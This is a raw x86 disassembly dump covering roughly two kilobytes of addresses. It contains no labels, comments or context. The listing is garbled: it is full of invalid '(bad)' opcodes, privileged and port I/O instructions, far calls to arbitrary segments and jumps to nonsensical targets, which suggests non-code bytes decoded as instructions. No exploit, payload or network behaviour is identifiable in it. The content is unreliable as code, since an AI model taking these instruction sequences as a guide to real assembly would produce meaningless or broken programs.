  422647:	and    al,0x8c
  422649:	int3   
  42264a:	das    
  42264b:	push   ebp
  42264c:	out    0x4a,al
  42264e:	adc    al,0x2f
  422650:	dec    ecx
  422651:	adc    al,0x8e
  422653:	ins    BYTE PTR es:[edi],dx
  422654:	rcl    DWORD PTR [edx],cl
  422656:	pop    esp
  422657:	mov    dh,BYTE PTR [eax-0x4d77aa3f]
  42265d:	(bad)  
  42265e:	fstp   QWORD PTR [edx+edi*8]
  422661:	push   0x21
  422663:	popa   
  422664:	imul   edx,DWORD PTR [edi-0x43],0x7dca8f78
  42266b:	sub    eax,0xea3bb06b
  422670:	(bad)  
  422671:	jno    0x42268c
  422673:	in     eax,dx
  422674:	cmp    dl,0x64
  422677:	sti    
  422678:	add    BYTE PTR cs:[esi+edi*1+0x32],bh
  42267d:	into   
  42267e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42267f:	(bad)  
  422680:	idiv   ebp
  422682:	fadd   DWORD PTR [esi+0x3f682964]
  422688:	jmp    0x4226aa
  42268a:	sti    
  42268b:	add    edi,DWORD PTR [eax-0x75]
  42268e:	dec    esp
  42268f:	loopne 0x4226ff
  422691:	mov    esp,0xa3b31f88
  422696:	cmp    DWORD PTR [ebp+ebp*8+0x6f],edi
  42269a:	dec    esi
  42269b:	pop    ecx
  42269c:	loopne 0x422699
  42269e:	mov    ah,0xf7
  4226a0:	loopne 0x42270c
  4226a2:	and    DWORD PTR [esi-0x2c],esp
  4226a5:	addr16 mov ecx,0x751cd3b1
  4226ab:	push   esp
  4226ac:	cmp    esi,DWORD PTR [edx+0x6bce79ec]
  4226b2:	wbinvd 
  4226b4:	int3   
  4226b5:	cmp    al,0x18
  4226b7:	mov    bl,0x36
  4226b9:	pusha  
  4226ba:	lds    edx,FWORD PTR [ecx*4-0x2241d8e6]
  4226c1:	lahf   
  4226c2:	inc    eax
  4226c3:	dec    ebx
  4226c4:	fnstenv [edx-0x41]
  4226c7:	cmp    eax,0xd580196c
  4226cc:	test   BYTE PTR [ebx-0x22c3fc12],bl
  4226d2:	adc    al,0x1b
  4226d4:	mov    al,0x18
  4226d6:	stos   WORD PTR es:[edi],ax
  4226d8:	cmp    DWORD PTR [ecx],edi
  4226da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226db:	js     0x4226e8
  4226dd:	push   0x2dcf430b
  4226e2:	(bad)  
  4226e3:	add    DWORD PTR [ecx+0x6d],0x37
  4226e7:	(bad)  
  4226e8:	and    edx,ebp
  4226ea:	mov    edi,0x84f758b9
  4226ef:	stc    
  4226f0:	sub    cl,ch
  4226f2:	mov    esi,0xf28b3e78
  4226f7:	rcl    dh,cl
  4226f9:	fcomp  DWORD PTR [ebx]
  4226fb:	ret    
  4226fc:	loopne 0x4226f0
  4226fe:	pop    es
  4226ff:	mov    esi,0x1ae200d
  422704:	sub    BYTE PTR es:[ebx-0x3a2126bd],cl
  42270b:	mov    ah,0xd1
  42270d:	scas   al,BYTE PTR es:[edi]
  42270e:	popf   
  42270f:	ss add eax,0xe6dfc26d
  422715:	out    dx,eax
  422716:	lea    ebx,[ecx+0xb]
  422719:	push   0xc296efa3
  42271e:	xor    ebp,DWORD PTR [edx]
  422720:	or     edi,DWORD PTR [ebx]
  422722:	inc    edi
  422723:	mov    ecx,ebp
  422725:	retf   0xcbb2
  422728:	out    dx,eax
  422729:	repnz stos BYTE PTR es:[edi],al
  42272b:	pop    es
  42272c:	lahf   
  42272d:	fwait
  42272e:	sub    eax,0x8290d0c9
  422733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422734:	jmp    0x4312fb87
  422739:	sub    BYTE PTR [ebx+0x32c6650f],al
  42273f:	xor    ebp,DWORD PTR [esi-0x4bc86969]
  422745:	scas   eax,DWORD PTR es:[edi]
  422746:	(bad)  
  422747:	(bad)  
  422748:	in     eax,dx
  422749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42274a:	dec    eax
  42274b:	mov    ebx,0xb39d98d1
  422750:	jns    0x4226fa
  422752:	scas   eax,DWORD PTR es:[edi]
  422753:	inc    eax
  422754:	int    0xd2
  422756:	mov    bl,0x28
  422758:	fwait
  422759:	pop    ecx
  42275a:	lahf   
  42275b:	rol    BYTE PTR [esi-0x32],cl
  42275e:	(bad)
  422761:	sbb    DWORD PTR [ebx-0x295b0f0e],0x2204d026
  42276b:	mov    ebp,0xf04ca9ac
  422770:	in     al,0x69
  422772:	jae    0x42272b
  422774:	sub    BYTE PTR [ecx+0x40],bl
  422777:	sti    
  422778:	jl     0x422754
  42277a:	ror    BYTE PTR [ebp-0x92fd23e],0xcd
  422781:	popa   
  422782:	push   edi
  422783:	loopne 0x422707
  422785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422786:	inc    edx
  422787:	jge    0x42277a
  422789:	(bad)  
  42278a:	xchg   edx,eax
  42278b:	inc    eax
  42278c:	add    al,0xe1
  42278e:	mov    ds:0x41c96e28,eax
  422793:	(bad)  
  422794:	iret   
  422795:	xor    esi,edx
  422797:	arpl   WORD PTR [edi+ecx*4],si
  42279a:	inc    edi
  42279b:	push   edx
  42279c:	call   0x38d57532
  4227a1:	and    bh,BYTE PTR [edi]
  4227a3:	nop
  4227a4:	ret    0xe419
  4227a7:	repnz mov eax,ds:0xcb5535ae
  4227ad:	push   cs
  4227ae:	cmp    DWORD PTR ds:0xd429f926,eax
  4227b4:	mov    ebx,0x65c638b0
  4227b9:	add    dh,dh
  4227bb:	inc    ebx
  4227bc:	loop   0x42276e
  4227be:	ds xchg ecx,eax
  4227c0:	stos   BYTE PTR es:[edi],al
  4227c1:	popf   
  4227c2:	loop   0x42282f
  4227c4:	mov    DWORD PTR [edi],ebx
  4227c6:	jo     0x42280d
  4227c8:	sar    BYTE PTR ds:0x64cdd3ca,0xa2
  4227cf:	imul   edi,DWORD PTR [ecx+0x15],0x11
  4227d3:	and    al,0xc9
  4227d5:	popf   
  4227d6:	test   eax,0xb359cff
  4227db:	fld    st(2)
  4227dd:	ret    0x2bdb
  4227e0:	hlt    
  4227e1:	dec    ecx
  4227e2:	in     al,0x9e
  4227e4:	mov    bh,0x38
  4227e6:	sub    eax,DWORD PTR [esi-0x2a]
  4227e9:	(bad)  [edx+0x6f]
  4227ec:	aad    0x47
  4227ee:	mul    bh
  4227f0:	sti    
  4227f1:	int    0x46
  4227f3:	dec    BYTE PTR [edi-0x67a1c106]
  4227f9:	(bad)  
  4227fa:	je     0x4227a4
  4227fc:	dec    esp
  4227fd:	cmp    al,0xe2
  4227ff:	test   edi,ebp
  422801:	xchg   ecx,eax
  422802:	pop    eax
  422803:	imul   ebx,edx,0xeec93a1e
  422809:	(bad)  
  42280a:	fdivr  QWORD PTR [edx+0x48]
  42280d:	jno    0x422837
  42280f:	mov    ch,0x67
  422811:	psubd  mm3,QWORD PTR [ebp+0x6b]
  422815:	les    esp,FWORD PTR [edi+0x53]
  422818:	scas   al,BYTE PTR es:[edi]
  422819:	pop    ds
  42281a:	inc    esp
  42281b:	pop    edx
  42281c:	jg     0x42285b
  42281e:	iret   
  42281f:	ins    BYTE PTR es:[edi],dx
  422820:	and    DWORD PTR [ecx+0x2bd010fb],edx
  422826:	fidivr WORD PTR [ecx]
  422828:	daa    
  422829:	es mov ah,0xeb
  42282c:	(bad)  
  42282e:	xchg   edi,ebx
  422830:	pop    ecx
  422831:	jne    0x4227fe
  422833:	or     al,0x22
  422835:	arpl   WORD PTR [ebp+edi*2+0xd221b3e],si
  42283c:	lods   eax,DWORD PTR ds:[esi]
  42283d:	xlat   BYTE PTR ds:[ebx]
  42283e:	jb     0x4227e4
  422840:	cmp    al,0x74
  422842:	lods   al,BYTE PTR ds:[esi]
  422843:	mov    al,ds:0xf41608fb
  422848:	xchg   edx,eax
  422849:	mov    DWORD PTR [ebp-0x2b],0xe3cdc75
  422850:	push   edx
  422851:	inc    edx
  422852:	and    al,0x29
  422854:	push   0xfffffff4
  422856:	mov    bl,BYTE PTR [eax-0x5ae80d6f]
  42285c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42285d:	in     al,dx
  42285e:	jecxz  0x42282f
  422860:	or     DWORD PTR [ebx],esp
  422862:	push   eax
  422863:	dec    eax
  422864:	mov    ebx,eax
  422866:	mov    bl,0x40
  422868:	jp     0x42284a
  42286a:	imul   ecx,DWORD PTR ds:0xc026fff9,0x2e
  422871:	ins    BYTE PTR es:[edi],dx
  422872:	cli    
  422873:	pop    es
  422874:	add    ebx,ebx
  422876:	adc    eax,0xa8016e9a
  42287b:	pop    edx
  42287c:	jno    0x422841
  42287e:	push   edx
  42287f:	jg     0x4228e0
  422881:	aad    0xb3
  422883:	mov    ah,0xb
  422885:	adc    bl,dh
  422887:	call   0x953e:0x1cece132
  42288e:	pop    esp
  42288f:	xchg   esi,eax
  422890:	mov    al,BYTE PTR [esi+0x78703829]
  422896:	retf   
  422897:	stos   DWORD PTR es:[edi],eax
  422898:	imul   ecx,ecx,0xffffff81
  42289b:	(bad)
  42289f:	dec    esp
  4228a0:	js     0x4228e6
  4228a2:	xchg   DWORD PTR fs:[edx],edi
  4228a5:	dec    edi
  4228a6:	inc    ebp
  4228a7:	xchg   bl,bh
  4228a9:	cli    
  4228aa:	push   cs
  4228ab:	call   0xb64489db
  4228b0:	mov    dl,0x89
  4228b2:	mov    dh,0xb8
  4228b4:	mov    edx,0x2805c3c
  4228b9:	add    BYTE PTR [edi],dl
  4228bb:	test   eax,0xd4a27618
  4228c0:	fwait
  4228c1:	ror    DWORD PTR [ebx+0x79],cl
  4228c4:	pop    edi
  4228c5:	and    eax,0xc6c9cc3
  4228ca:	and    al,0x1c
  4228cc:	int    0xfa
  4228ce:	adc    eax,0xb5efbac
  4228d3:	fcom   QWORD PTR [edx-0xd]
  4228d6:	ins    BYTE PTR es:[edi],dx
  4228d7:	fcmovnu st,st(3)
  4228d9:	imul   esi,DWORD PTR [edx],0x4b
  4228dc:	or     ch,bl
  4228de:	sbb    bl,bh
  4228e0:	icebp  
  4228e1:	xor    DWORD PTR [esi+0x22],ebp
  4228e4:	enter  0xd57b,0x9e
  4228e8:	jecxz  0x422931
  4228ea:	pop    eax
  4228eb:	xor    BYTE PTR [ebx],0x57
  4228ee:	cdq    
  4228ef:	popa   
  4228f0:	loop   0x42296e
  4228f2:	xor    BYTE PTR [edx+0x9a36799],dl
  4228f8:	cli    
  4228f9:	sbb    dl,BYTE PTR [edx-0x52]
  4228fc:	loope  0x4228fb
  4228fe:	daa    
  4228ff:	jmp    FWORD PTR [eax-0x44927775]
  422905:	sbb    eax,0xfe14e8f5
  42290a:	xchg   DWORD PTR [edx],ecx
  42290c:	inc    eax
  42290d:	add    eax,0xf8448acb
  422912:	inc    edi
  422913:	adc    dh,BYTE PTR [eax]
  422915:	mov    esp,0x9c039120
  42291a:	pop    eax
  42291b:	jp     0x4228ca
  42291d:	ret    
  42291e:	adc    DWORD PTR [ecx-0x6399aff7],eax
  422924:	(bad)  
  422925:	in     eax,0x88
  422927:	mov    eax,0xe133e30
  42292c:	ss das 
  42292e:	cmp    DWORD PTR [edx-0x70],esi
  422931:	ins    DWORD PTR es:[edi],dx
  422932:	js     0x42298f
  422934:	fbld   TBYTE PTR [ecx]
  422936:	addr16 push edi
  422938:	cmp    al,0xa1
  42293a:	push   esi
  42293b:	repz fstp st(5)
  42293e:	addr16 nop
  422940:	pop    edx
  422941:	push   cs
  422942:	out    dx,eax
  422943:	repz or eax,0xaf75f655
  422949:	mov    dh,0xd8
  42294b:	and    dh,BYTE PTR [ecx+0x22428d87]
  422951:	pushf  
  422952:	mov    ah,0x52
  422954:	ds stos DWORD PTR es:[edi],eax
  422956:	ret    0x6920
  422959:	std    
  42295a:	push   edi
  42295b:	mov    ah,BYTE PTR [edi]
  42295d:	sbb    dh,bh
  42295f:	xchg   esp,eax
  422960:	xor    eax,0x854f62f1
  422965:	pop    es
  422966:	jge    0x4229b8
  422968:	mov    esp,0xe019ffaa
  42296d:	xchg   ebx,eax
  42296e:	add    ch,dl
  422970:	imul   eax,DWORD PTR ds:0x438b4599,0xc50796b4
  42297a:	sbb    BYTE PTR [ecx+0x1b87762e],dh
  422980:	fs (bad) 
  422983:	push   ebx
  422984:	iret   
  422985:	mov    bh,0xee
  422987:	pop    esi
  422988:	pushf  
  422989:	mov    fs,WORD PTR [ecx]
  42298b:	loop   0x42299d
  42298d:	jbe    0x42291b
  42298f:	mov    esi,0x23fb0530
  422994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422995:	fsubr  DWORD PTR [ebp+0x47577005]
  42299b:	mov    dh,0x9e
  42299d:	sti    
  42299e:	cmovl  edi,DWORD PTR [edi]
  4229a1:	stos   DWORD PTR es:[edi],eax
  4229a2:	mov    ah,0x7f
  4229a4:	outs   dx,DWORD PTR ds:[esi]
  4229a5:	aaa    
  4229a6:	test   al,0x2d
  4229a8:	fst    DWORD PTR ds:0x9cd27fc4
  4229ae:	add    ebp,ecx
  4229b0:	mov    esi,0xd36ca437
  4229b5:	neg    eax
  4229b7:	imul   edx,DWORD PTR [ecx-0x64],0xffffff90
  4229bb:	xchg   esp,eax
  4229bc:	and    ebp,ebp
  4229be:	push   ebx
  4229bf:	cld    
  4229c0:	nop
  4229c1:	jo     0x422954
  4229c3:	jb     0x422989
  4229c5:	pop    ebp
  4229c6:	jecxz  0x4229e1
  4229c8:	into   
  4229c9:	in     eax,dx
  4229ca:	jno    0x4229e3
  4229cc:	imul   edi,DWORD PTR [ecx-0xa],0xf030f009
  4229d3:	pop    ebp
  4229d4:	sar    BYTE PTR [esp+eax*8-0xc],0x38
  4229d9:	cmp    ecx,edi
  4229db:	(bad)  
  4229dc:	leave  
  4229dd:	jae    0x422a27
  4229df:	int    0x4e
  4229e1:	retf   0x4b96
  4229e4:	out    0x1a,al
  4229e6:	(bad)  
  4229e7:	aas    
  4229e8:	pop    edi
  4229e9:	scas   eax,DWORD PTR es:[edi]
  4229ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229eb:	or     al,BYTE PTR [ebp+0x58]
  4229ee:	mov    edi,0xead4d415
  4229f3:	jbe    0x422a20
  4229f5:	and    ch,ch
  4229f7:	inc    esp
  4229f8:	pop    ss
  4229f9:	mov    edi,fs
  4229fb:	mov    ecx,cs
  4229fd:	add    esp,eax
  4229ff:	ins    DWORD PTR es:[edi],dx
  422a00:	sbb    DWORD PTR [ebp+0x23],ebx
  422a03:	shr    bh,1
  422a05:	mov    al,ds:0x9f02c445
  422a0a:	pop    ebp
  422a0b:	push   esi
  422a0c:	cdq    
  422a0d:	cmp    eax,0xd1e5ca6c
  422a12:	xor    ebx,DWORD PTR [edi+0x65]
  422a15:	(bad)  
  422a16:	cmp    al,0xdc
  422a18:	adc    DWORD PTR [esi],ecx
  422a1a:	add    bl,BYTE PTR [edi]
  422a1c:	lods   al,BYTE PTR ds:[esi]
  422a1d:	fnsave [ebx+0x252a4b38]
  422a23:	jmp    0x228a57cb
  422a28:	adc    al,0xfe
  422a2a:	lahf   
  422a2b:	sti    
  422a2c:	das    
  422a2d:	mov    eax,ds:0xa94ad56e
  422a32:	jg     0x422a8b
  422a34:	mov    ds:0x3b6210f6,eax
  422a39:	ficom  WORD PTR [edx+0x1abf66e1]
  422a3f:	jne    0x4229f5
  422a41:	std    
  422a42:	adc    eax,0x749abfc
  422a47:	shr    esp,0x2d
  422a4a:	sub    bh,BYTE PTR [ebx]
  422a4c:	lds    ebx,FWORD PTR [edi+eax*8-0x16]
  422a50:	mov    ds:0x5383daea,eax
  422a55:	sbb    ecx,edi
  422a57:	mov    esi,0x53a6dc60
  422a5c:	and    dh,BYTE PTR [ebx]
  422a5e:	inc    ebp
  422a5f:	push   DWORD PTR [esi+0x6c]
  422a62:	or     al,0x2d
  422a64:	jns    0x422acf
  422a66:	xor    al,0xe3
  422a68:	cmp    BYTE PTR [ecx+0x57cd03dd],bl
  422a6e:	dec    ecx
  422a6f:	inc    eax
  422a70:	retf   
  422a71:	aas    
  422a72:	mov    bh,0xc1
  422a74:	sub    dl,bh
  422a76:	xchg   ebx,eax
  422a77:	mov    edx,0xf58c4576
  422a7c:	xor    eax,0x6cf6a88f
  422a81:	push   cs
  422a82:	mov    esp,0xb704df0a
  422a87:	lods   al,BYTE PTR ds:[esi]
  422a88:	fmul   DWORD PTR [ebp+0x49]
  422a8b:	(bad)  
  422a8c:	popf   
  422a8d:	mov    bh,BYTE PTR [ecx+0x55c139d8]
  422a93:	jecxz  0x422a6d
  422a95:	push   ebx
  422a96:	sbb    ecx,esi
  422a98:	(bad)  
  422a99:	in     eax,0x3d
  422a9b:	shr    DWORD PTR [eax],cl
  422a9d:	mov    WORD PTR [ebp+0x2c],ds
  422aa0:	mov    ecx,0xe0d1232e
  422aa5:	xchg   ecx,eax
  422aa6:	call   0x4ad7:0x1cb26e0b
  422aad:	inc    ebx
  422aae:	aaa    
  422aaf:	pop    edx
  422ab0:	in     eax,0x7e
  422ab2:	cmp    dh,dh
  422ab4:	push   es
  422ab5:	jl     0x422b1d
  422ab7:	push   ds
  422ab8:	mov    ebp,0x875537b
  422abd:	je     0x422a59
  422abf:	ja     0x422a8c
  422ac1:	add    dh,BYTE PTR [ebp+0x92aabc]
  422ac7:	dec    ebp
  422ac8:	sub    eax,0x701e4d9
  422acd:	(bad)
  422ad2:	xor    eax,0xf564f6c8
  422ad7:	arpl   WORD PTR [ebx+ecx*2-0x5d],bp
  422adb:	mov    dh,0x65
  422add:	sbb    ebx,edx
  422adf:	sbb    cl,bl
  422ae1:	xor    al,BYTE PTR [esi+0x5afbe42c]
  422ae7:	pop    ds
  422ae8:	repz out dx,al
  422aea:	inc    esi
  422aeb:	sub    edi,esp
  422aed:	jmp    0x422b24
  422aef:	xchg   ecx,eax
  422af0:	lods   eax,DWORD PTR ds:[esi]
  422af1:	dec    edi
  422af2:	mov    DWORD PTR [ebx+ecx*1-0x28],ebp
  422af6:	mov    bh,BYTE PTR [edi+0x35]
  422af9:	mov    al,ds:0x505b8df6
  422afe:	test   DWORD PTR [esp+edi*1+0x2e10b8f1],ecx
  422b05:	dec    esp
  422b06:	cmp    ecx,DWORD PTR [ebx+0xaff7ce6]
  422b0c:	or     al,0xf0
  422b0e:	int3   
  422b0f:	pop    es
  422b10:	dec    ebp
  422b11:	sbb    ebp,DWORD PTR [ebx-0x473afeee]
  422b17:	ins    DWORD PTR es:[edi],dx
  422b18:	stos   DWORD PTR es:[edi],eax
  422b19:	cmc    
  422b1a:	sub    esi,edi
  422b1c:	dec    edi
  422b1d:	popf   
  422b1e:	pop    edi
  422b1f:	popf   
  422b20:	fucom  st(7)
  422b22:	in     al,0xcd
  422b24:	jp     0x422b20
  422b26:	pop    ecx
  422b27:	mov    cl,BYTE PTR [eax+0x12]
  422b2a:	sub    eax,0x985b056f
  422b2f:	arpl   WORD PTR [edi-0x4],sp
  422b32:	xor    ebp,DWORD PTR [edi]
  422b34:	jbe    0x422ad1
  422b36:	mov    esi,0xc5573102
  422b3b:	pop    eax
  422b3c:	inc    ebp
  422b3d:	div    BYTE PTR [ebx-0x29515e0e]
  422b43:	dec    esi
  422b44:	mov    eax,0x6027d667
  422b49:	dec    eax
  422b4a:	cwde   
  422b4b:	pushf  
  422b4c:	cmp    DWORD PTR [ecx+0x1bb7e3db],0x688feece
  422b56:	aaa    
  422b57:	push   ss
  422b58:	ins    DWORD PTR es:[edi],dx
  422b59:	mov    ah,0x99
  422b5b:	ficom  DWORD PTR [esi+eiz*2]
  422b5e:	mov    eax,ds:0x3519e6cb
  422b63:	faddp  st(4),st
  422b65:	add    dh,BYTE PTR [eax]
  422b67:	dec    edi
  422b68:	sub    esp,DWORD PTR [esi+0x1f]
  422b6b:	(bad)  
  422b6d:	ret    
  422b6e:	and    eax,0xe2fd6798
  422b73:	pop    ebx
  422b74:	addr16 push edi
  422b76:	shr    DWORD PTR [edx-0x41],0xcc
  422b7a:	imul   DWORD PTR [ebx+0x677971d]
  422b80:	dec    ebp
  422b81:	aad    0x97
  422b83:	xlat   BYTE PTR ds:[ebx]
  422b84:	xchg   esi,eax
  422b85:	int    0xf4
  422b87:	mov    ecx,DWORD PTR [edi+0x5a8bff00]
  422b8d:	mov    edi,0xbd93a06f
  422b92:	js     0x422b65
  422b94:	mov    bl,bh
  422b96:	mov    ch,0x73
  422b98:	out    0x52,al
  422b9a:	xlat   BYTE PTR ds:[ebx]
  422b9b:	push   es
  422b9c:	jo     0x422b4e
  422b9e:	dec    ebx
  422b9f:	mov    ch,0xcf
  422ba1:	aas    
  422ba2:	in     al,dx
  422ba3:	or     ecx,DWORD PTR es:[edi-0x29]
  422ba7:	mov    eax,ds:0x993be14d
  422bac:	es movsx edi,ax
  422bb0:	dec    esp
  422bb1:	retf   
  422bb2:	push   esp
  422bb3:	lds    edi,FWORD PTR [edx]
  422bb5:	shl    DWORD PTR [eax-0x63],1
  422bb8:	or     eax,0x9d3be7bb
  422bbd:	pusha  
  422bbe:	or     al,0x8f
  422bc0:	or     DWORD PTR [edx],esi
  422bc2:	cmp    DWORD PTR [edx+0x5],0x3f
  422bc6:	inc    ebx
  422bc7:	std    
  422bc8:	loop   0x422b58
  422bca:	dec    edi
  422bcb:	and    eax,0xf3d754e
  422bd0:	push   eax
  422bd1:	fisubr DWORD PTR [edi+ebp*4]
  422bd4:	(bad)  
  422bd6:	punpckhbw mm5,mm6
  422bd9:	and    dl,BYTE PTR [ebx-0x3b]
  422bdc:	xor    BYTE PTR [esi-0x337c4c73],bl
  422be2:	mov    eax,ds:0x8275b499
  422be7:	mov    dh,BYTE PTR [ebp+0x19]
  422bea:	shr    DWORD PTR [edi-0x6a499fee],cl
  422bf0:	jns    0x422c17
  422bf2:	or     ch,BYTE PTR [esi]
  422bf4:	xchg   ecx,eax
  422bf5:	sbb    esp,DWORD PTR [edx]
  422bf7:	dec    ecx
  422bf8:	and    ah,BYTE PTR [ebx]
  422bfa:	fisub  WORD PTR [esi+eax*8+0x64]
  422bfe:	xor    ebp,0x727c5bf5
  422c04:	mov    eax,ds:0xfcfd9034
  422c09:	(bad)  
  422c0a:	scas   al,BYTE PTR es:[edi]
  422c0b:	mov    ebx,0xf93bdd26
  422c10:	clc    
  422c11:	cwde   
  422c12:	inc    eax
  422c13:	loop   0x422bed
  422c15:	rcr    BYTE PTR ds:0xac856aea,0x72
  422c1c:	lods   eax,DWORD PTR ds:[esi]
  422c1d:	aas    
  422c1e:	fcom   QWORD PTR [eax+esi*4]
  422c21:	aam    0xc0
  422c23:	sbb    eax,0x94054d3d
  422c28:	mov    DWORD PTR [edi],edi
  422c2a:	jmp    0x422c30
  422c2c:	jae    0x422c6c
  422c2e:	(bad)  
  422c2f:	sub    DWORD PTR [ebp+ecx*4+0x727b04c9],esp
  422c36:	repnz mov dh,0x70
  422c39:	les    eax,FWORD PTR [ecx+0x6183191f]
  422c3f:	sbb    edx,DWORD PTR gs:[eax-0x16]
  422c43:	retf   
  422c44:	push   ebx
  422c45:	fist   DWORD PTR [ecx]
  422c47:	and    esi,DWORD PTR [edx+eax*2-0x48]
  422c4b:	push   ebx
  422c4c:	xor    DWORD PTR [esi-0x15],esi
  422c4f:	mov    bl,BYTE PTR [edi+0x46966c8d]
  422c55:	out    0xb7,al
  422c57:	jno    0x422bea
  422c59:	mov    esp,0xafd29e85
  422c5e:	in     eax,dx
  422c5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c60:	mov    esp,0x83549693
  422c66:	cmp    DWORD PTR [edi-0x6b],ecx
  422c69:	pop    eax
  422c6a:	test   DWORD PTR [ecx-0x5ac62ba7],eax
  422c70:	add    ah,0x93
  422c73:	xchg   ebx,eax
  422c74:	sbb    al,0xdb
  422c76:	loope  0x422c11
  422c78:	mov    ebx,esi
  422c7a:	xchg   esi,eax
  422c7b:	or     dh,ch
  422c7d:	in     al,0xbc
  422c7f:	pop    ss
  422c80:	sub    BYTE PTR [esi],al
  422c82:	dec    esi
  422c83:	rcl    cl,1
  422c85:	in     eax,0xe5
  422c87:	out    dx,al
  422c88:	int3   
  422c89:	in     al,0xf9
  422c8b:	mov    al,ds:0x6bf73da8
  422c90:	mov    eax,0x9503c887
  422c95:	lock rcl DWORD PTR gs:[ebx-0x7a81729b],cl
  422c9d:	jle    0x422ce0
  422c9f:	jge    0x422c7d
  422ca1:	mov    DWORD PTR [esp+esi*2+0xf7f9d36],ebp
  422ca8:	fadd   QWORD PTR [edi+eiz*2+0x5a00408]
  422caf:	mov    BYTE PTR [esi-0x7c],dl
  422cb2:	std    
  422cb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cb4:	adc    al,0x48
  422cb6:	xchg   edx,eax
  422cb7:	cmp    bh,bl
  422cb9:	and    al,0xc9
  422cbb:	test   DWORD PTR [ebx+0x2d6827cb],ebp
  422cc1:	dec    ebx
  422cc2:	add    edi,DWORD PTR [ebx+0x7a]
  422cc5:	mov    eax,ds:0xf08e9ea9
  422cca:	imul   ebp,DWORD PTR [eax+0x3a],0x21
  422cce:	and    ah,0x78
  422cd1:	push   esp
  422cd2:	loopne 0x422c73
  422cd4:	shl    BYTE PTR [edi],0x1b
  422cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cd8:	mov    eax,0x602bd827
  422cdd:	pusha  
  422cde:	push   ds
  422cdf:	das    
  422ce0:	(bad)  
  422ce1:	fisttp WORD PTR [edx*2+0x750e9905]
  422ce8:	jne    0x422c76
  422cea:	sub    ecx,edi
  422cec:	sahf   
  422ced:	cmc    
  422cee:	adc    esp,0xffffff9c
  422cf1:	scas   al,BYTE PTR es:[edi]
  422cf2:	mov    ecx,0x5fd5f453
  422cf7:	push   0x71d0ee07
  422cfc:	dec    BYTE PTR [eax-0x77]
  422cff:	or     eax,0xb00db555
  422d04:	add    bh,BYTE PTR [ebx+0x20]
  422d07:	inc    ebx
  422d08:	jmp    0x1eb15e7e
  422d0d:	xchg   ecx,eax
  422d0e:	xlat   BYTE PTR ds:[ebx]
  422d0f:	add    DWORD PTR [ecx+0x7d4762ec],edi
  422d15:	dec    esp
  422d16:	js     0x422cc9
  422d18:	adc    eax,0x9479e1bc
  422d1d:	mov    dl,0xe8
  422d1f:	aas    
  422d20:	div    BYTE PTR [eax]
  422d22:	fsub   DWORD PTR [ecx+0x54]
  422d25:	sub    DWORD PTR [ecx],ecx
  422d27:	daa    
  422d28:	(bad)  
  422d29:	fimul  WORD PTR [edi+0x36951371]
  422d2f:	shl    ebp,1
  422d31:	aad    0xbb
  422d33:	fst    QWORD PTR [edx*4+0x3ee4eb9a]
  422d3a:	int3   
  422d3b:	fild   QWORD PTR ds:0xb6351740
  422d41:	sbb    al,0xda
  422d43:	dec    edx
  422d44:	push   eax
  422d45:	addr16 aam 0xae
  422d48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d49:	in     al,0xf
  422d4b:	(bad)  
  422d4c:	std    
  422d4d:	jae    0x422d0b
  422d4f:	mov    bh,0x97
  422d51:	push   ss
  422d52:	jbe    0x422dac
  422d54:	repz fbld TBYTE PTR [eax+ebx*4-0x47]
  422d59:	fcmovnb st,st(2)
  422d5b:	inc    esi
  422d5c:	dec    esp
  422d5d:	(bad)  [ebp+0x77ead27b]
  422d63:	xchg   edx,eax
  422d64:	xor    BYTE PTR [ecx+ebx*1-0x80],dh
  422d68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d6a:	into   
  422d6b:	rcl    esi,0xdd
  422d6e:	inc    eax
  422d6f:	push   cs
  422d70:	pop    edi
  422d71:	add    eax,0x320539de
  422d76:	mov    ds,edi
  422d78:	leave  
  422d79:	(bad)  
  422d7a:	push   esi
  422d7b:	out    0x76,al
  422d7d:	(bad)  
  422d7e:	adc    edi,edi
  422d80:	mov    edi,0xf7779f09
  422d85:	stos   BYTE PTR es:[edi],al
  422d86:	repnz adc ebp,DWORD PTR [edi+0x1d]
  422d8a:	je     0x422d51
  422d8c:	jbe    0x422d5d
  422d8e:	es inc edx
  422d90:	out    0xaa,al
  422d92:	cwde   
  422d93:	mov    esp,cr5
  422d96:	cdq    
  422d97:	add    al,0x1c
  422d99:	sbb    eax,0xc0919bb0
  422d9e:	clc    
  422d9f:	pop    edx
  422da0:	ret    
  422da1:	call   0x87ce:0x84e3fc6e
  422da8:	mov    eax,0x4dc7f14a
  422dad:	xchg   esp,eax
  422dae:	imul   BYTE PTR [ebp-0x19af0a4c]
  422db4:	sahf   
  422db5:	xor    eax,0x812c9ce8
  422dba:	imul   edi,DWORD PTR [ecx+0x151d061b],0xffffffe3
  422dc1:	adc    ebp,DWORD PTR [esi+eax*2-0x7b5b04a2]
  422dc8:	cmp    BYTE PTR [edi-0x2c],ch
  422dcb:	outs   dx,DWORD PTR ds:[esi]
  422dcc:	aad    0x53
  422dce:	or     eax,0x3b9c7f30
  422dd3:	and    al,0xe5
  422dd5:	iretw  
  422dd7:	mov    esp,0xf8e1b04b
  422ddc:	jg     0x422ded
  422dde:	sbb    eax,edi
  422de0:	sbb    esi,0x40d08986
  422de6:	or     DWORD PTR [edx+ebp*1+0x5f7cfda7],esi
  422ded:	push   0xb3e115bb
  422df2:	mov    bh,0x11
  422df4:	ins    DWORD PTR es:[edi],dx
  422df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422df6:	xchg   edx,eax
  422df7:	ins    DWORD PTR es:[edi],dx
  422df8:	ss out dx,eax
  422dfa:	js     0x422d87
  422dfc:	jmp    0x2324c6de
  422e01:	fmulp  st(3),st
  422e03:	add    al,BYTE PTR [ebp-0x22]
  422e06:	(bad)  
  422e07:	cli    
  422e08:	xor    eax,0x744666cb
